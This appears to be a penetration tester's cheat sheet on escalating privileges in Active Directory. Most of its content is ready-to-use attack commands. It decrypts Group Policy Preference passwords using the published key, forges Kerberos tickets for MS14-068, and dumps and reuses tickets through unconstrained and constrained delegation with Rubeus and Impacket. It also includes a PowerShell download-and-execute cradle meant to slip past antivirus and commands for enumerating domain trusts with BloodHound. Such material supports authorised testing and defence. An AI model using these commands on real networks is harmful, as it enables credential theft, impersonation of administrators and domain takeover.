# Elevation of Privilege

## **MS14-025 (Group Policy Preferences)**

* Clear text credentials in SYSVOL policies: look in&#x20;
  * `<HOST>\SYSVOL\<FOLDER>\Policies\<FOLDER>`
* Credentials in Group Policy Preferences (GPP):
  * `findstr /I /S "cpassword" *.xml`
  * Break the password:&#x20;
    * `gp3finder.exe -D <CPASSWORD>(` or manually `echo '<CPASSWORD>' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000`
  * Metasploit module
    * `post/windows/gather/credentials/gpp`
  * Powersploit module
    * `Get-GPPPassword`

## **MS14-068 (CVE-2014-6324)**

> This vulnerability enables an attacker to modify an existing and valid TGT by adding the false statement (by modifying the PAC) that the user is a member of sensitive group (as Domain Admins). The DC will validate that TGT, enabling attacker improper access to any resource on the network.

* When a user logs on a domain for the first time, the user name and password are validated by the DC and a domain logon token (TGT) is created and provided to the user.
* The user doesn’t have to re-authenticate to the DC to access resources on the domain, the user simply presents the TGT to the DC and receives a resource access token (TGS).
* The user then provides the resource access token to the server hosting the service.
* The DC trusts all non-expired logon tickets (TGT) since they are signed by the domain’s Kerberos account.

Python Kerberos Exploitation Kit (PyKEK) & Mimikatz:

* `ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr>`
  * It will saves the forged TGT to a ccache file in the current working directory.\
    You can grab the SSID through `whoami` when you are logged in as the target user, or use `[Security.Principal.WindowsIdentity]::GetCurrent()` Powershell function.
* `mimikatz.exe kerberos::ptc c:\temp\<TGTFILE.CCACHE> exit`

## **Unconstrained delegation (KUD)**

> An attacker with admin rights on a local server with unconstrained delegation will have access to the TGT of all the users that have been connected to the server

### **Find the delegation**

* From Windows: [https://github.com/samratashok/ADModule](https://github.com/samratashok/ADModule)
  * `PS> Get-ADComputer -Filter {TrustedForDelegation -eq $True}`
* From Unix: [https://github.com/dirkjanm/ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
  * `ldapdomaindump -u "<DOMAIN>\<USERNAME>" -p "<PWD>" <IP>`
  * Then grep the unconstrained delegation from the DUMP: `grep TRUSTED_FOR_DELEGATION domain_computers.grep`

### **Exploit**

* Dump TGT from the memory : `.\Rubeus.exe dump`
* Dump in live the new TGT after each success : `\Rubeus.exe monitor /interval:5`
* Grab the TGS using a TGT : `.\Rubeus.exe asktgs /ticket:<TICKET_BASE64> /service:<SPN> /ptt`

## **Contrained delegation (KCD)**

> If you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, it's possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to. [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

* Find user with KCD enabled : `Get-NetUser -TrustedToAuth`
  * User has to have an attribute `TRUSTED_TO_AUTH_FOR_DELEGATION`
*   With Rubeus :

    ```
    Rubeus.exe tgtdeleg
    Rubeus.exe s4u /ticket:<BASE64> /impersonateuser:administrator /domain:<DOMAIN> /msdsspn:<SERVICE>/<SERVER> /dc:<DOMAIN_CONTROLER> /ptt
    ```

    * `Rubeus.exe s4u /user:<USERNAME> /rc4:<HASH> /impersonateuser:<USER_TO_IMPERSONATE> /domain:<DOMAIN> /dc:<DOMAIN_CONTROLER> /msdsspn:<SERVICE>/<SERVER> /ptt`
* With Impacket : `getST.py -spn <SERVICE>/<SERVER> '<DOMAIN>/<USERNAME>:<PWD>' -impersonate Administrator -dc-ip <IP>`

## **Resource Based Constrained Delegation**

> WiP

## **Trust relation**

> WiP

### **Enumerate**

* `nltest /trusted_domains` (installed by default on Windows)
* `dsquery * -filter "(objectClass=trustedDomain)" -attr *`
* `Get-ADTrust` : PowerShell Windows module for Active Directory, use LDAP requests
  * Require RSAT (remote admin tools)
  * `Get-ADTrust -Filter * -Properties *`
  * `(Get-ADForest).Domains | ForEach-Object { Get-ADTrust -Server $_ -Filter * -Properties * }`
* `Get-ForestTrust` et `Get-DomainTrust` : Cmdlets of `PowerView` from `PowerSploit`
  *   Powerview is catch by AV, you need to inject it directly in the memory

      ```
      IEX (New-Object Net.WebClient).DownloadString('https://<IP>:<PORT>/Pw.ps1');
      Get-ForestTrust
      Get-DomainTrust
      ```

## **PrivExchange**

> WiP

## **Attack paths**

> WiP

* Use BloodHound to get a dynamic and graphical representation of the active directory:
  * From a domain workstation:
    * Upload the `SharpHound.ps1` file on a domain workstation
    * Launch `powershell`
    * `Import-Module .\SharpHound`
    * `Invoke-BloodHound -CollectionMethod All` will generate .JSON files and compress them in a .ZIP. Copy the .ZIP in your VM
  * From your computer:
    * Launch neo4J `sudo neo4j console`
    * The HTTP server is launched `http://127.0.0.1:7474/browser/`
    * Start BloodHound `sudo bloodhound`
      * If you get a white screen do Ctrl+R
    * Drag\&Drop the .ZIP in BH
* From CommandoVM (out of domain)
  * `runas /netonly /user:<DOMAIN>\<USER> powershell.exe`
  * `Import-Module .\SharpHound.ps1`
  * `Invoke-BloodHound -Verbose -DomainController 25.1.37.17 -Domain "<DOMAIN>" -LDAPUser "<USER>" -LDAPPass "<PWD>" -CollectionMethod All`
